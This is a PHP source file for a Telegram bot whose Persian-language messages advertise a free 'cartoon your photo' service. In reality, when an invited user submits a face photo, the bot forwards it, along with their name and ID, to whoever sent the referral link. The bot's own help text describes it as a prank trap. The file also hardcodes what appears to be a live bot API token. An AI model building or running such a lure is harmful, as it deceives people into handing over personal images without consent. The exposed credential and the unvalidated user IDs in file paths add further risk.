<?php
ob_start();
error_reporting(0);
flush();
define('API_KEY','5068138048:AAGRs3jj14GVtQEztPliQoIBknD3X3s-37o');
function WSBot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$Dev = array("2116595014"); 
// اطلاعات زیر بدون @
$usernamebot = "Biodiegogrambot";
$channel = "botdiegogram";
$manager = "diego_gram_film";
$token = API_KEY;
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$message_id = $message->message_id;
$first_name = $message->from->first_name;
$firstname = $update->callback_query->from->first_name;
$last_name = $message->from->last_name;
$username = $message->from->username;
$textmassage = $message->text;
$messageid = $update->callback_query->message->message_id;
$tc = $update->message->chat->type;
$chatid = $update->callback_query->message->chat->id;
$fromid = $update->callback_query->from->id;
$data = $update->callback_query->data;
$membercall = $update->callback_query->id;
$reply = $update->message->reply_to_message->forward_from->id;
$forchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=@".$channel."&user_id=".$from_id));
$tch = $forchannel->result->status;
$remove = json_encode(['Remove_keyboard'=>[
],'remove_keyboard'=>true]);
@$juser = json_decode(file_get_contents("data/$from_id.json"),true);
@$cuser = json_decode(file_get_contents("data/$fromid.json"),true);
if($textmassage =="/start"){
    if($tch == 'member' or $tch == 'creator' or $tch == 'administrator'){
WSBot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"😄 سلام $first_name
 
😃 به ربات عکستو کارتونی کن خوش اومدی
😝 این یک ربات مچ گیریه ! تا حالا دلت خواسته عکس یهویی از دوستات داشته باشی ؟

😅 این ربات مخصوص این کاره ! چطوری ؟ دکمه '🗣 لینک من' رو بزن ! 
😁 یک لینک اختصاصی بهت میدم اونو برای دوستات بفرست .
😆 من خودمو جوری معرفی میکنم که انگار واقعا یک ربات عکس کارتونیم دوستت عکسش رو میفرسته تا کارتونی کنم اما من عکس رو برای تو میفرستم 🤣
به همین راحتی ! پس همین الان شروع کن 😇",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
            	'keyboard'=>[
				           [
                   ['text'=>"🗣 لینک من"],['text'=>"🤔 راهنما"]
                ],
 	],
            	'resize_keyboard'=>true
       		])
    		]);
$juser = json_decode(file_get_contents("data/$from_id.json"),true);	
$juser["userfild"]["step"]="none";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}else{
			WSBot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🍃  برای استفاده از این ربات لازم است ابتدا وارد کانال زیر شوید 

@$channel @$channel  📣
@$channel @$channel  📣

☑️ بعد از عضویت در کانال میتوانید از دکمه ها استفاده کنید",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"📍 عضویت در کانال",'url'=>"https://t.me/$channel"]
	],
              ]
        ])
    		]);
}
}
elseif($textmassage=="🤔 راهنما"){
if($tch == 'member' or $tch == 'creator' or $tch == 'administrator'){	
WSBot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>" ربات عکستو کارتونی کن یک ربات برای لحظات شاد و دوس داشتنی برای شما 
😝  تا حالا دلت خواسته عکس یهویی از دوستات داشته باشی ؟

😅 این ربات مخصوص این کاره ! چطوری ؟ دکمه '🗣 لینک من' رو بزن ! 
😁 یک لینک اختصاصی بهت میدم اونو برای دوستات بفرست .
😆 من خودمو جوری معرفی میکنم که انگار واقعا یک ربات عکس کارتونیم دوستت عکسش رو میفرسته تا کارتونی کنم اما من عکس رو برای تو میفرستم 🤣
به همین راحتی ! پس همین الان شروع کن 😇
😎 قفط حواست باشه چیزی رو لو ندی ! و فقط لینکو براشون بفرستی

🤖 @$usernamebot",
'reply_to_message_id'=>$message_id,
]);
}
else
{
			WSBot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🍃  برای استفاده از این ربات لازم است ابتدا وارد کانال زیر شوید 

@$channel @$channel  📣
@$channel @$channel  📣

☑️ بعد از عضویت در کانال میتوانید از دکمه ها استفاده کنید",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"📍 عضویت در کانال",'url'=>"https://t.me/$channel"]
	],
              ]
        ])
    		]);
}
}
elseif(strpos($textmassage , '/start ') !== false  ) {
$start = str_replace("/start ","",$textmassage);
if($start == $from_id){
WSBot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"
	بچه بیا پایین بابا
🤔 خودت با لینک دعوت خودتت میخوای وارد بشی ؟ یعنی چی ! عقلت سالمه ؟ 
 
❗️ لینک دعوتت رو برای دوستات بفرست عزیزم . نمیشه که عکس خودت رو برای خودت بفرستی ! بعد بگی واییی عجب عکسی کِش رفتم عجب چیزیه ! ☹️
👇🏻 با استفاده از دکمه '🗣 لینک من' لینکت رو بگیر و برای دوستات بفرست باهوشم",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
            	'keyboard'=>[
			    [
                   ['text'=>"🗣 لینک من"],['text'=>"🤔 راهنما"]
                ],
 	],
            	'resize_keyboard'=>true
       		])
    		]);
}else{
 WSBot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"😄 سلام $first_name
 
📸 به ربات عکستو کارتونی کن خوش اومدی 🌹
⭐️ تو به وسیله این ربات میتونی عکس خودت رو کارتونی کنی و کلی افکت های مختلف روی عکست بزاری

🏵 افکت های ربات شامل 👇🏻
🔘 کارتونی , پیرکردن , جوانی کردن , زیبایی چهره , تغییر رنگ مو , تغییر رنگ چشم و ... 

🗣 برای شروع و استفاده از این ربات فوق العاده کافیه از دکمه '📸 ارسال عکس' استفاده کنی",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
            	'keyboard'=>[
				[
				['text'=>"📸 ارسال عکس"]
				],
 	],
            	'resize_keyboard'=>true
       		])
    		]);
    		
$juser = json_decode(file_get_contents("data/$from_id.json"),true);
$juser["userfild"]["ax"]="$start";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
}
elseif($textmassage=="🗣 لینک من"){
if($tch == 'member' or $tch == 'creator' or $tch == 'administrator'){	
$reply = WSBot('sendPhoto',[
        'chat_id'=>$chat_id,
        'photo'=>new CURLFile('photo/kartoni.jpg'),
        'caption'=>"$first_name دعوتت کرده
😇تا با استفاده از این ربات خیلی سریع عکستو کارتونی کنی و کلی افکت های جالب روش بزاری

💯رایگان و سریع
👇روی لینک زیر کلیک کن
https://telegram.me/$usernamebot?start=$from_id",])->result->message_id;
WSBot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"
😆 پیام بالا حاوی لینک دعوت اختصاصیت برای دعوت دیگرانه 👆🏻
🤣 لینک رو برای دوستات بفرست تا ببینی چه عکس های باحال و یهویی میتونی ازشون بگیری
😎 فقط حواست باشه چیزی رو لو ندی ! و فقط لینکو براشون بفرستی

🤗 تازه اگر میخوای بنرت دعوتت با عکس کارتونی پروفایل خودت باشه از دکمه زیر استفاده کن 👇🏻",
'reply_to_message_id'=>$reply,
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
        [
            ['text'=>" 📸 پروفایل خودم",'callback_data'=>"myprof"]
            ],
        ]
    ])
]);
}else{
			WSBot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🍃  برای استفاده از این ربات لازم است ابتدا وارد کانال زیر شوید 

@$channel @$channel  📣
@$channel @$channel  📣

☑️ بعد از عضویت در کانال میتوانید از دکمه ها استفاده کنید",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"📍 عضویت در کانال",'url'=>"https://t.me/$channel"]
	],
              ]
        ])
    		]);
}
}
elseif($textmassage == '📸 ارسال عکس'){
if($tch == 'member' or $tch == 'creator' or $tch == 'administrator'){
    WSBot('sendPhoto',[
        'chat_id'=>$chat_id,
        'photo'=>new CURLFile('photo/ax.jpg'),
        'caption'=>"
📸 لطفا عکس خود را ماننده تصویر دارای تیک سبز ارسال کنید .
😃 سعی کنید چهره شما مشخص باشد و نور کافی وجود داشته باشد

👇🏻 لطفا عکس را ارسال کنید",
'reply_to_message_id'=>$message_id,
'reply_markup'=>$remove,
]);
$get = $juser['userfild']['ax'];
    		WSBot('sendmessage',[
    		    'chat_id'=>$get,
    		    'text'=>"یک نفر با مشخصات [$first_name](tg://user?id=$from_id) وارد ربات شد 🌟",
    		    'parse_mode'=>'MarkDown',
    		]);
$juser = json_decode(file_get_contents("data/$from_id.json"),true);
$juser["userfild"]["step"]="get";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}else{
   WSBot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🍃  برای استفاده از این ربات لازم است ابتدا وارد کانال زیر شوید 

@$channel @$channel  📣
@$channel @$channel  📣

☑️ بعد از عضویت در کانال میتوانید از دکمه '📸 ارسال عکس' استفاده کنید",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"📍 عضویت در کانال",'url'=>"https://t.me/$channel"]
	],
              ]
        ])
    		]); 
}
}
elseif ($juser["userfild"]["step"] == 'get'){
    if($update->message->photo != true){ 
    WSBot('sendPhoto',[
        'chat_id'=>$chat_id,
        'photo'=>new CURLFile('photo/ax.jpg'),
        'caption'=>"
📸 لطفا عکس خود را ماننده تصویر دارای تیک سبز ارسال کنید .
😃 سعی کنید چهره شما مشخص باشد و نور کافی وجود داشته باشد

👇🏻 لطفا عکس را ارسال کنید",
'reply_to_message_id'=>$message_id,
]);
}else{
$get = $juser['userfild']['ax'];
WSBot("forwardMessage",['chat_id' =>$get,'from_chat_id'=>$chat_id,'message_id' => $message_id]);
WSBot('sendmessage',['chat_id'=>$get,'text'=>"🌟 کاربر [$first_name](tg://user?id=$from_id) عکسش رو ارسال کرد 👆🏻",'parse_mode'=>"MarkDown"]);
WSBot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
😂 آخ آخ 
😆 این یک ربات مچ گیری بود
😜 عکسی که فرستادی رو برای کسی که دعوتت کرده بود ارسال کردم 😅",
'reply_to_message_id'=>$message_id,
]);
WSBot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
😝  تا حالا دلت خواسته عکس یهویی از دوستات داشته باشی ؟

😅 این ربات مخصوص این کاره ! چطوری ؟ دکمه '🗣 لینک من' رو بزن ! 
😁 یک لینک اختصاصی بهت میدم اونو برای دوستات بفرست .
😆 من خودمو جوری معرفی میکنم که انگار واقعا یک ربات عکس کارتونیم دوستت عکسش رو میفرسته تا کارتونی کنم اما من عکس رو برای تو میفرستم 🤣
🙄 مثل همین بلایی که الان سر تو اومد !
به همین راحتی ! پس همین الان شروع کن 😇",
'reply_markup'=>json_encode([
            	'keyboard'=>[
				           [
                   ['text'=>"🗣 لینک من"],['text'=>"🤔 راهنما"]
                ],
 	],
            	'resize_keyboard'=>true
       		])
]);
$juser = json_decode(file_get_contents("data/$from_id.json"),true);
$juser["userfild"]["step"]="none";
$juser["userfild"]["ax"]="none";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
}
elseif($data == "myprof"){
$photo_id = WSBot('getUserProfilePhotos',['user_id'=>$fromid,'limit'=>1])->result->photos[0][2]->file_id;
$file = WSBot('getFile',['file_id'=>$photo_id])->result->file_path;
$URL = 'https://api.telegram.org/file/bot'.API_KEY.'/'.$file;
$api = "https://api.wstm.pro/effects/?url=$URL&filter=9";
WSBot('answercallbackquery', [
            'callback_query_id' => $update->callback_query->id,
            'text' => "⏳ درحال ساخت بنر اختصاصی شما ...",
            'show_alert' => false
]);
$reply = WSBot('sendPhoto',[
        'chat_id'=>$chatid,
        'photo'=>$api,
        'caption'=>"$firstname دعوتت کرده
😇تا با استفاده از این ربات خیلی سریع عکستو کارتونی کنی و کلی افکت های جالب روش بزاری

💯رایگان و سریع
👇روی لینک زیر کلیک کن
https://telegram.me/$usernamebot?start=$fromid",])->result->message_id;
WSBot('sendmessage',[
	'chat_id'=>$chatid,
	'text'=>"
😆 پیام بالا حاوی لینک دعوت اختصاصیت برای دعوت دیگرانه 👆🏻
🤣 لینک رو برای دوستات بفرست تا ببینی چه عکس های باحال و یهویی میتونی ازشون بگیری
😎 فقط حواست باشه چیزی رو لو ندی ! و فقط لینکو براشون بفرستی",
'reply_to_message_id'=>$reply,
]);
}
//panel admin
elseif($textmassage=="/panel" or $textmassage=="panel" or $textmassage=="مدیریت"){
if ($tc == "private") {
if (in_array($from_id,$Dev)){
WSBot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🚦 ادمین عزیز به پنل مدریت ربات خوش امدید",
         'reply_to_message_id'=>$message_id,
	  'reply_markup'=>json_encode([
    'keyboard'=>[
	  	  	 [
		['text'=>"📍 امار ربات"],                   
		 ],
 	[
	  	['text'=>"📍 ارسال به همه"],['text'=>"📍 فروارد همگانی"]
	  ],
   ],
      'resize_keyboard'=>true
   ])
 ]);
}
}
}
elseif($textmassage=="برگشت 🔙"){
if ($tc == "private") {
if (in_array($from_id,$Dev)){
WSBot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🚦 به منوی مدیریت بازگشتید",
         'reply_to_message_id'=>$message_id,
	  'reply_markup'=>json_encode([
    'keyboard'=>[
	  	  	 [
		['text'=>"📍 امار ربات"],                
		 ],
 	[
	  	['text'=>"📍 ارسال به همه"],['text'=>"📍 فروارد همگانی"]
	  ],
   ],
      'resize_keyboard'=>true
   ])
 ]);
$juser["userfild"]["file"]="none";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);		
}
}
}
elseif($textmassage=="📍 امار ربات"){
if (in_array($from_id,$Dev)){
$files1 = scandir("data/");
$all = count($files1);
				WSBot('sendmessage',[
		'chat_id'=>$chat_id,
		'text'=>"🤖 امار ربات شما : 
		
📌 تعداد عضو ها : $all",
		]);
		}
}

elseif ($textmassage == '📍 ارسال به همه' ) {
if (in_array($from_id,$Dev)){
         WSBot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"لطفا متن خود را ارسال کنید 🚀",
	  'reply_to_message_id'=>$message_id,
	   'reply_markup'=>json_encode([
    'keyboard'=>[
	[
	['text'=>"برگشت 🔙"] 
	]
   ],
      'resize_keyboard'=>true
   ])
 ]);
$juser["userfild"]["file"]="sendtoall";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);		
}
}
elseif ($juser["userfild"]["file"] == 'sendtoall') {
if ($textmassage != "برگشت 🔙") {
         WSBot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"پیام شما با موفقیت برای ارسال همگانی تنظیم شد  ✔️",
	  'reply_to_message_id'=>$message_id,
 ]);
$inuser = json_decode(file_get_contents("user.json"),true);
$inuser["text"]="$textmassage";
$inuser["sendtoall"]="true";
$inuser = json_encode($inuser,true);
file_put_contents("user.json",$inuser);	
$juser["userfild"]["file"]="none";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);	
}
}
elseif ($textmassage == '📍 فروارد همگانی' ) {
if (in_array($from_id,$Dev)){
         WSBot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"لطفا متن خود را فوروارد کنید  🚀",
	  'reply_to_message_id'=>$message_id,
	   'reply_markup'=>json_encode([
    'keyboard'=>[
	[
	['text'=>"برگشت 🔙"] 
	]
   ],
      'resize_keyboard'=>true
   ])
 ]);
$juser["userfild"]["file"]="fortoall";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);		
}
}
elseif ($juser["userfild"]["file"] == 'fortoall') {
if ($textmassage != "برگشت 🔙") {
         WSBot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"پیام شما با موفقیت به عنوان فوروارد همگانی تنظیم شد ✔️",
	  'reply_to_message_id'=>$message_id,
 ]);
$inuser = json_decode(file_get_contents("user.json"),true);
$inuser["msg"]="$message_id";
$inuser["chat"]="$chat_id";
$inuser["fortoall"]="true";
$inuser = json_encode($inuser,true);
file_put_contents("user.json",$inuser);	
$juser["userfild"]["file"]="none";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);		
}
}
elseif($textmassage){
    WSBot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"❗️ پیامت رو متوجه نشدم
 
😃 به ربات عکستو کارتونی کن خوش اومدی
😝 این یک ربات مچ گیریه ! تا حالا دلت خواسته عکس یهویی از دوستات داشته باشی ؟

😅 این ربات مخصوص این کاره ! چطوری ؟ دکمه '🗣 لینک من' رو بزن ! 
😁 یک لینک اختصاصی بهت میدم اونو برای دوستات بفرست .
😆 من خودمو جوری معرفی میکنم که انگار واقعا یک ربات عکس کارتونیم دوستت عکسش رو میفرسته تا کارتونی کنم اما من عکس رو برای تو میفرستم 🤣
به همین راحتی ! پس همین الان شروع کن 😇",
        'reply_to_message_id'=>$message_id,
        ]);
}
unlink("error_log");
?>
